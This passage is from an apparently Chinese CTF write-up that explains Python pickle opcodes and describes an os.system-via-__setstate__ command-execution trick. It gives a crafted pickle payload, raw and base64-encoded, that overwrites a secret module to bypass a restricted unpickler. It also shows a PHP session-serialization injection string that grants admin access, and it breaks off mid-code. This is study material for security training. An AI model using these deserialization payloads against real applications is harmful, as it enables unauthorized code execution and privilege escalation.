f&apos;Animal(name=&#123;self.name!r&#125;, category=&#123;self.category!r&#125;)&apos;</span><br><span class="line"></span><br><span class="line">    def __eq__(self, other):</span><br><span class="line">        return type(other) is Animal and self.name == other.name and self.category == other.category</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    animal = Animal(&quot;kotori&quot;, &quot;umi&quot;)</span><br><span class="line">    s = pickle.dumps(animal)</span><br><span class="line">    print(s)</span><br><span class="line">    s = pickletools.optimize(s)</span><br><span class="line">    pickletools.dis(s)</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">b&apos;\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00nameq\x03X\x06\x00\x00\x00kotoriq\x04X\x08\x00\x00\x00categoryq\x05X\x03\x00\x00\x00umiq\x06ub.&apos;</span><br><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     &apos;__main__ Animal&apos;</span><br><span class="line">   19: )    EMPTY_TUPLE</span><br><span class="line">   20: \x81 NEWOBJ</span><br><span class="line">   21: &#125;    EMPTY_DICT</span><br><span class="line">   22: (    MARK</span><br><span class="line">   23: X        BINUNICODE &apos;name&apos;</span><br><span class="line">   32: X        BINUNICODE &apos;kotori&apos;</span><br><span class="line">   43: X        BINUNICODE &apos;category&apos;</span><br><span class="line">   56: X        BINUNICODE &apos;umi&apos;</span><br><span class="line">   64: u        SETITEMS   (MARK at 22)</span><br><span class="line">   65: b    BUILD</span><br><span class="line">   66: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>
<p><code>\x80</code> 读到这个操作符后，机器继续往下读取一个字符也就是<code>\x03</code><br><code>\x03</code> 是使用的序列化协议版本，pickle一共有0、2、3、4号版本协议，默认为3号，<code>\x03</code>就是使用3号协议。同时协议是向前兼容的，0号协议无论几号协议都是能够解析的<br><code>c</code> 是<code>GLOBAL</code>操作符，用于引入模块。机器读到后会继续读取两个连续的字符串<code>module</code>和<code>name</code>，以<code>\n</code>分隔，然后放入栈中。这里引入的是<code>__main__.Animal</code><br><code>q\x00</code> 没查到是什么，看起来是来分隔命令的<br><code>)</code> 往栈里压入一个一个空元组<br><code>\x81</code> 将栈顶的空元组弹出作为<code>args</code>，然后再将栈顶的<code>class</code>弹出记为<code>cls</code>，然后进行实例化再压入栈。也就是将<code>__main__.Animal</code>实例化</p>
<p>此时实例化的<code>Animal</code>里面是空的<br>继续分析</p>
<p><code>}</code> 往栈压入一个空字典<br><code>(</code> 是<code>MARK</code>操作符，将当前栈作为一个list压入前序栈，然后清空当前栈（这里的当前栈和前序栈文章里有说）<br><code>X</code> 读入一个二进制字符串，以<code>q\x0x</code>结尾。执行了四个<code>X</code>后，当前栈由底到顶就是<code>name kotori category umi</code><br><code>u</code> 将当前栈的数据pop到空数组<code>arr</code>中，执行后<code>arr=[&#39;name&#39;,&#39;kotori&#39;,&#39;category&#39;,&#39;umi&#39;]</code>。然后回到<code>MARK</code>前的状态，也就是当前栈中存有<code>Animal</code>和一个空字典。最后两个为一组键值对读取<code>arr</code>存入空字典中，此时空字典<code>dict={&#39;name&#39;:&#39;kotori&#39;,&#39;category&#39;:&#39;umi&#39;}</code><br><code>b</code> 将栈顶元素存入<code>state</code>，然后弹掉，也就是将<code>dict</code>存入<code>state</code>。然后再将栈顶元素存入<code>inst</code>，弹掉，也就是将<code>Animal</code>存入<code>inst</code>。然后用<code>state</code>更新对象<code>inst</code>，也就是给实例化的空对象填入内容<br><code>.</code> 弹出反序列化后的对象，结束反序列化</p>
<p>这里在用<code>state</code>更新对象<code>inst</code>处有安全问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">def load_build(self):</span><br><span class="line">        stack = self.stack</span><br><span class="line">        state = stack.pop()</span><br><span class="line">        inst = stack[-1]</span><br><span class="line">        setstate = getattr(inst, &quot;__setstate__&quot;, None)</span><br><span class="line">        if setstate is not None:</span><br><span class="line">            setstate(state)</span><br><span class="line">            return</span><br><span class="line">        slotstate = None</span><br><span class="line">        if isinstance(state, tuple) and len(state) == 2:</span><br><span class="line">            state, slotstate = state</span><br><span class="line">        if state:</span><br><span class="line">            inst_dict = inst.__dict__</span><br><span class="line">            intern = sys.intern</span><br><span class="line">            for k, v in state.items():</span><br><span class="line">                if type(k) is str:</span><br><span class="line">                    inst_dict[intern(k)] = v</span><br><span class="line">                else:</span><br><span class="line">                    inst_dict[k] = v</span><br><span class="line">        if slotstate:</span><br><span class="line">            for k, v in slotstate.items():</span><br><span class="line">                setattr(inst, k, v)</span><br><span class="line">    dispatch[BUILD[0]] = load_build</span><br></pre></td></tr></table></figure>
<p>看到pickle源码的<code>load_build()</code><br>可以看到当<code>inst</code>（实例化的类）中有<code>__setstate__</code>属性时，这会执行<code>setstate()</code>，并以<code>state</code>的值的参数。也就是说，如果能控制<code>__setstate__</code>属性的属性值为系统函数，并且<code>state</code>为可控的，就能够执行任意命令</p>
<p><img src="http://shifeng-kaze.cn/blog/GXZY_web_wp/fd5f5da0167c9d14c17d50233da480cc.png" alt=""></p>
<p>文章中给出这么一个操作，设置<code>state={&#39;__setstate__&#39;:&#39;os.system&#39;}</code>，然后<code>BUILD</code>后实例化中的类就有了<code>__setstate__</code>属性。然后将<code>ls /</code>压入栈，再进行一次<code>BUILD</code>。此时<code>state=&#39;ls /&#39;</code>，而<code>inst</code>中也有<code>__setstate__</code>属性，值为<code>os.system</code>。这样就会执行<code>setstate(state)</code>，也就是<code>os.system(’ls /’)</code>，读取了根目录</p>
<p>不过这个和下面解这题的内容没太大关系，只是我一开始没理解这里记录一下而已。不过这个方法解这题应该也是可行的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def index():</span><br><span class="line">    if request.args.get(&apos;source&apos;):</span><br><span class="line">        return Response(read(__file__), mimetype=&apos;text/plain&apos;)</span><br><span class="line"></span><br><span class="line">    if request.method == &apos;POST&apos;:</span><br><span class="line">        try:</span><br><span class="line">            pickle_data = request.form.get(&apos;data&apos;)</span><br><span class="line">            if b&apos;R&apos; in base64.b64decode(pickle_data):</span><br><span class="line">                return &apos;No... I don\&apos;t like R-things. No Rabits, Rats, Roosters or RCEs.&apos;</span><br><span class="line">            else:</span><br><span class="line">                result = restricted_loads(base64.b64decode(pickle_data))</span><br><span class="line">                if type(result) is not Animal:</span><br><span class="line">                    return &apos;Are you sure that is an animal???&apos;</span><br><span class="line">            correct = (result == Animal(secret.name, secret.category))</span><br><span class="line">            return render_template(&apos;unpickle_result.html&apos;, result=result, pickle_data=pickle_data, giveflag=correct)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(repr(e))</span><br><span class="line">            return &quot;Something wrong&quot;</span><br><span class="line"></span><br><span class="line">    sample_obj = Animal(&apos;一给我哩giaogiao&apos;, &apos;Giao&apos;)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()</span><br><span class="line">    return render_template(&apos;unpickle_page.html&apos;, sample_obj=sample_obj, pickle_data=pickle_data)</span><br></pre></td></tr></table></figure>
<p>这题看<code>/</code>部分，需要反序列化后的结果和用密钥对实例化的结果相同才给flag</p>
<p>文章中说到的<code>__reduce_</code>执行任意函数需要指令码<code>R</code>，而这题中过滤掉了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if b&apos;R&apos; in base64.b64decode(pickle_data):</span><br><span class="line">                return &apos;No... I don\&apos;t like R-things. No Rabits, Rats, Roosters or RCEs.&apos;</span><br></pre></td></tr></table></figure>
<p>同时由于<code>find_class()</code>被重写，只能够由<code>__main__</code>引入，直接指向<code>secret</code>中的值是不可能了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class RestrictedUnpickler(pickle.Unpickler):</span><br><span class="line">    def find_class(self, module, name):</span><br><span class="line">        if module == &apos;__main__&apos;:</span><br><span class="line">            return getattr(sys.modules[&apos;__main__&apos;], name)</span><br><span class="line">        raise pickle.UnpicklingError(&quot;global &apos;%s.%s&apos; is forbidden&quot; % (module, name))</span><br></pre></td></tr></table></figure>
<p>这里利用文章中的另一种方式，篡改module<br>虽然只能由<code>__main__</code>引入，但import进来的<code>secret</code>也是属于<code>__main__</code>的。于是可以通过<code>c</code>指令给<code>secret</code>中的属性赋值</p>
<p>这里由于原题给出的源码不太好复现，就改了一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*- </span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">import secret </span><br><span class="line"></span><br><span class="line">print(secret.name)</span><br><span class="line">print(secret.category)</span><br><span class="line"></span><br><span class="line">class Animal:</span><br><span class="line">    def __init__(self, name, category):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return f&apos;Animal(name=&#123;self.name!r&#125;, category=&#123;self.category!r&#125;)&apos;</span><br><span class="line"></span><br><span class="line">    def __eq__(self, other):</span><br><span class="line">        return type(other) is Animal and self.name == other.name and self.category == other.category</span><br><span class="line"></span><br><span class="line">class RestrictedUnpickler(pickle.Unpickler):</span><br><span class="line">    def find_class(self, module, name):</span><br><span class="line">        if module == &apos;__main__&apos;:</span><br><span class="line">            return getattr(sys.modules[&apos;__main__&apos;], name)</span><br><span class="line">        raise pickle.UnpicklingError(&quot;global &apos;%s.%s&apos; is forbidden&quot; % (module, name))</span><br><span class="line"></span><br><span class="line">def restricted_loads(s):</span><br><span class="line">    return RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    pickle_data = &quot;&quot;</span><br><span class="line">    if b&apos;R&apos; in base64.b64decode(pickle_data):</span><br><span class="line">        print(&apos;No... I don\&apos;t like R-things. No Rabits, Rats, Roosters or RCEs.&apos;)</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        result = restricted_loads(base64.b64decode(pickle_data))</span><br><span class="line">    if type(result) is not Animal:</span><br><span class="line">        print(type(result))</span><br><span class="line">        print(&apos;Are you sure that is an animal???&apos;)</span><br><span class="line">        exit()</span><br><span class="line">    correct = (result == Animal(secret.name, secret.category))</span><br><span class="line">    print(correct)</span><br></pre></td></tr></table></figure>
<p>先序列化一个正常的<code>Animal</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import pickletools</span><br><span class="line">import secret</span><br><span class="line"></span><br><span class="line">class Animal:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.name = &apos;kotori&apos;</span><br><span class="line">        self.category = &apos;umi&apos;</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	animal = Animal()</span><br><span class="line">	print(pickle.dumps(animal))</span><br></pre></td></tr></table></figure>
<p><code>\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x06\x00\x00\x00kotoriq\x04X\x08\x00\x00\x00categoryq\x05X\x03\x00\x00\x00umiq\x06ub.</code></p>
<p><code>secret</code>和<code>Animal</code>差不多，改个名，把<code>)</code>和<code>\x81</code>去掉即可</p>
<p><code>\x80\x03c__main__\nsecret\nq\x00}q\x01(X\x04\x00\x00\x00nameq\x02X\x06\x00\x00\x00kotoriq\x03X\x08\x00\x00\x00categoryq\x04X\x03\x00\x00\x00umiq\x05ub.</code></p>
<p>接着<code>BUILD</code>指令后接上<code>POP</code>指令，将<code>sercet</code>弹出，防止反序列化结束时有多个实例导致出错</p>
<p><code>\x80\x03c__main__\nsecret\nq\x00}q\x01(X\x04\x00\x00\x00nameq\x02X\x06\x00\x00\x00kotoriq\x03X\x08\x00\x00\x00categoryq\x04X\x03\x00\x00\x00umiq\x05ub0.</code></p>
<p>然后接上去掉<code>\x80\x03</code>的<code>Animal</code></p>
<p><code>\x80\x03c__main__\nsecret\nq\x00}q\x01(X\x04\x00\x00\x00nameq\x02X\x06\x00\x00\x00kotoriq\x03X\x08\x00\x00\x00categoryq\x04X\x03\x00\x00\x00umiq\x05ub0c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x06\x00\x00\x00kotoriq\x04X\x08\x00\x00\x00categoryq\x05X\x03\x00\x00\x00umiq\x06ub.</code></p>
<p>这里发现好像<code>q\x0x</code>并不要求每次增1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import pickletools</span><br><span class="line">import secret</span><br><span class="line"></span><br><span class="line">class Animal:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.name = &apos;kotori&apos;</span><br><span class="line">        self.category = &apos;umi&apos;</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	s = b&quot;\x80\x03c__main__\nsecret\nq\x00&#125;q\x01(X\x04\x00\x00\x00nameq\x02X\x06\x00\x00\x00kotoriq\x03X\x08\x00\x00\x00categoryq\x04X\x03\x00\x00\x00umiq\x05ub0c__main__\nAnimal\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00nameq\x03X\x06\x00\x00\x00kotoriq\x04X\x08\x00\x00\x00categoryq\x05X\x03\x00\x00\x00umiq\x06ub.&quot;</span><br><span class="line">	s = pickletools.optimize(s)</span><br><span class="line">	pickletools.dis(s)</span><br><span class="line">	res = pickle.loads(s)</span><br><span class="line">	print(res.name)</span><br></pre></td></tr></table></figure>
<p>测试一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     &apos;__main__ secret&apos;</span><br><span class="line">   19: &#125;    EMPTY_DICT</span><br><span class="line">   20: (    MARK</span><br><span class="line">   21: X        BINUNICODE &apos;name&apos;</span><br><span class="line">   30: X        BINUNICODE &apos;kotori&apos;</span><br><span class="line">   41: X        BINUNICODE &apos;category&apos;</span><br><span class="line">   54: X        BINUNICODE &apos;umi&apos;</span><br><span class="line">   62: u        SETITEMS   (MARK at 20)</span><br><span class="line">   63: b    BUILD</span><br><span class="line">   64: 0    POP</span><br><span class="line">   65: c    GLOBAL     &apos;__main__ Animal&apos;</span><br><span class="line">   82: )    EMPTY_TUPLE</span><br><span class="line">   83: \x81 NEWOBJ</span><br><span class="line">   84: &#125;    EMPTY_DICT</span><br><span class="line">   85: (    MARK</span><br><span class="line">   86: X        BINUNICODE &apos;name&apos;</span><br><span class="line">   95: X        BINUNICODE &apos;kotori&apos;</span><br><span class="line">  106: X        BINUNICODE &apos;category&apos;</span><br><span class="line">  119: X        BINUNICODE &apos;umi&apos;</span><br><span class="line">  127: u        SETITEMS   (MARK at 85)</span><br><span class="line">  128: b    BUILD</span><br><span class="line">  129: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br><span class="line">kotori</span><br></pre></td></tr></table></figure>
<p>没问题<br>于是base64加密放入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    pickle_data = &quot;gANjX19tYWluX18Kc2VjcmV0CnEAfXEBKFgEAAAAbmFtZXECWAYAAABrb3RvcmlxA1gIAAAAY2F0ZWdvcnlxBFgDAAAAdW1pcQV1YjBjX19tYWluX18KQW5pbWFsCnEAKYFxAX1xAihYBAAAAG5hbWVxA1gGAAAAa290b3JpcQRYCAAAAGNhdGVnb3J5cQVYAwAAAHVtaXEGdWIu&quot;</span><br><span class="line">    if b&apos;R&apos; in base64.b64decode(pickle_data):</span><br><span class="line">        print(&apos;No... I don\&apos;t like R-things. No Rabits, Rats, Roosters or RCEs.&apos;)</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        result = restricted_loads(base64.b64decode(pickle_data))</span><br><span class="line">    if type(result) is not Animal:</span><br><span class="line">        print(type(result))</span><br><span class="line">        print(&apos;Are you sure that is an animal???&apos;)</span><br><span class="line">        exit()</span><br><span class="line">    correct = (result == Animal(secret.name, secret.category))</span><br><span class="line">    print(correct)</span><br></pre></td></tr></table></figure>
<p><img src="http://shifeng-kaze.cn/blog/GXZY_web_wp/4c4fce5b82f9c782d46c9aa5cfcf1df8.png" alt=""></p>
<p>结果成功覆盖</p>
<h2 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h2><p><code>www.zip</code>获得源码</p>
<p><code>init.php</code>中设置了session的序列化类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//初始化整个页面</span><br><span class="line">error_reporting(0);</span><br><span class="line">//lib.php包括一些常见的函数</span><br><span class="line">include &apos;lib.php&apos;;</span><br><span class="line">session_save_path(&apos;session&apos;);</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;,&apos;php_serialize&apos;);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>
<p>猜测是session反序列化漏洞</p>
<p>而在<code>profile.php</code>中找到了不同的序列方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_save_path(&apos;session&apos;);</span><br><span class="line">include &apos;lib.php&apos;;</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">class info</span><br><span class="line">&#123;</span><br><span class="line">    public $admin;</span><br><span class="line">    public $sign;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;admin = $_SESSION[&apos;admin&apos;];</span><br><span class="line">        $this-&gt;sign = $_SESSION[&apos;sign&apos;];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sign;</span><br><span class="line">        if ($this-&gt;admin === 1) &#123;</span><br><span class="line">            redirect(&apos;./core/index.php&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new info();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>同时可以看到，当admin为1是，跳转<code>/core/index.php</code>中</p>
<p><code>/core/index.php</code>中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once(&apos;./init.php&apos;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (check_session($_SESSION)) &#123;</span><br><span class="line">    #变成管理员吧，奥利给</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&apos;只有管理员才能看到我哟&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>会对session进行检查</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//初始化整个页面</span><br><span class="line">#error_reporting(0);</span><br><span class="line">//lib.php包括一些常见的函数</span><br><span class="line">include &apos;../lib.php&apos;;</span><br><span class="line">session_save_path(&apos;../session&apos;);</span><br><span class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>
<p>同时也是使用php方式的序列化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function check_session($session)</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($session as $keys =&gt; $values) &#123;</span><br><span class="line">        foreach ($values as $key =&gt; $value) &#123;</span><br><span class="line">            if ($key === &apos;admin&apos; &amp;&amp; $value === 1) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>check_session()</code>检查session中需要有一个值为数组，且数组中为admin的键的值为1</p>
<p>然后再去到<code>upload_sign.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once(&apos;init.php&apos;);</span><br><span class="line"></span><br><span class="line">class upload_sign</span><br><span class="line">&#123;</span><br><span class="line">    public $sign;</span><br><span class="line">    public $admin = 0;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        if (isset($_POST[&apos;sign&apos;])) &#123;</span><br><span class="line">            $this-&gt;sign = $_POST[&apos;sign&apos;];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;sign = &quot;这里空空如也哦&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function upload()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;checksign($this-&gt;sign)) &#123;</span><br><span class="line">            $_SESSION[&apos;sign&apos;] = $this-&gt;sign;</span><br><span class="line">            $_SESSION[&apos;admin&apos;] = $this-&gt;admin;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;???&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function checksign($sign)</span><br><span class="line">    &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new upload_sign();</span><br><span class="line">$a-&gt;upload();</span><br></pre></td></tr></table></figure>
<p>这里将POST得到的sign放入session中，可以利用这里注入session</p>
<p>于是构造一个符合条件的sign值<br><code>|a:1:{s:5:&quot;admin&quot;;i:1;}sign|s:4:&quot;xxxx&quot;;}</code><br>这里将第一个键值设为数组，且里面只有一个admin的键值对，这样就可以通过<code>check_session()</code></p>
<p>设置完访问一次<code>/profile.php</code>再去访问<code>/core/index.php</code>，获得源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">require_once(&apos;./init.php&apos;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (check_session($_SESSION)) &#123;</span><br><span class="line">    #hint : core/clear.php</span><br><span class="line">    $sandbox = &apos;./sandbox/&apos; . md5(&quot;Mrk@1xI^&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    echo $sandbox;</span><br><span 